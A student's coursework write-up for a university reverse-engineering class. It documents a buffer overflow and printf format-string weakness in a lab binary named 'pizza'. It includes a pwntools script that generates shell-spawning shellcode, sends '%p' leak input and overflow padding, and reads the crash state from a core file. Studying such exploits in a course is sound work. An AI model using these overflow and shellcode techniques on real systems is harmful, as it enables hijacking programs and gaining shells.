# CS479/579 Reverse Engineering at NMSU
## Karina Gonzales

### Disclaimer: I have modeled this after the link that was given in the posted assignmnet. 

### The Code:

  This is the code that I gathered from Ghidra that was used in the Pizza program. The code basically replicates a pizza transaction with a costumer. I believe that the use of printf allows us to use %p to expose its vulnerability.


![Screenshot from 2023-05-02 20-02-19](https://user-images.githubusercontent.com/111537927/235828898-fe196cce-f0b6-41b5-adae-cae4c8069295.png)

  Here is how I reached the segmentation fault. 


![Screenshot from 2023-05-02 20-57-52](https://user-images.githubusercontent.com/111537927/235830421-3dba45e7-bb27-4cbf-823f-e57489a42732.png)

  Because I dont want to input my responses every time that I create the fault I put in automated responsed to cause the segmentation fault in the python script to be used.

![Screenshot from 2023-05-05 22-19-16](https://user-images.githubusercontent.com/111537927/236601828-45a84296-2a25-4f40-bd78-e7d2bbebeb20.png)

  Also to keep this automated and get the information I need about the fault I had to locate the core file. That was the big struggle for me. There was a lot of confusion initially of how the core file is used. Once I learned that, I found the core file. The core file was located in the location "/var/lib/apport/coredump/core._home_aggie_Downloads_pizza.1000.5ee8c735-2685-4494-a494-151979063b51.7826.2462538". Unfortunately for me I could not use the usual command to find the core file so I had to directly give the core file to be observed. I also had to run the command "ulimit -c unlimited" to make the environment for the core files unlimited. This allowed for the core files to actually generate in the loction they were supposed to. At some point I also used the command 
"cat /proc/sys/kernel/core_pattern". 

  To my knowledge... The core file is generated when the program fails due to a segmentation fault. The core file conatins information of what was happening at the moment that it failed. This could allow us to get information that we need to find a way to create a buffer overflow to change the return address and control the program by sending the address of our own code. The return address should be below the rbp so I would need to overflow the rbp like displayed.            

 ![Screenshot from 2023-05-06 19-18-20](https://user-images.githubusercontent.com/111537927/236654265-6385bdf3-aeea-45f4-98c4-c18d768d1ddc.png)
 
 Here is the pwntools code:
 
 ```
 #!/usr/bin/env python3

from pwn import *

#context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

getname_address = elf.symbols["getname"]

shellcode = asm(shellcraft.amd64.linux.sh())

print(f"Shellcode: {shellcode.hex().upper()}")
print(len(shellcode))

input1 = b"Cantinflas"
name = b"%p %p %p %p %p %p"
num = b"1"
cred = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
victim = process("./pizza")

print(str(victim.recvline()))
victim.sendline(name)
print(str(victim.recvline()))
victim.sendline(num)
print(str(victim.recvline()))
victim.sendline(cred)
print(str(victim.recvline()))

#victim.sendline(payload)
victim.wait()
#victim.interactive()
#core = victim.corefile
core = Corefile("/var/lib/apport/coredump/core._home_aggie_Downloads_pizza.1000.e7ee7302-ab8a-4577-8e5b-8bf275f2b61a.9224.1995902")
rsp = core.rsp
rbp = core.rbp
rip = core.rip

top_of_stack = core.read(rsp,8)
top_of_stack_1 = core.read(rsp,8)

rip_offset = cyclic_find(rsp)

print(f"rsp: {hex(rsp)}")
print(f"rbp: {hex(rbp)}")
print(f"rip: {hex(rip)}")

print(f"Top of the stack contains: {hex(int.from_bytes(top_of_stack,'little'))}")
print(f" stack + 1 contains: {hex(int.from_bytes(top_of_stack_1,'little'))}")
print(f"the rip offset is {hex(rip_offset)}")
                                                          
 ```

I am unsure if I was required to attach specific shell code to this to be comepletely honest or just show how we have learned to get information from the core file and use that for the buffer overflow... 
 
 
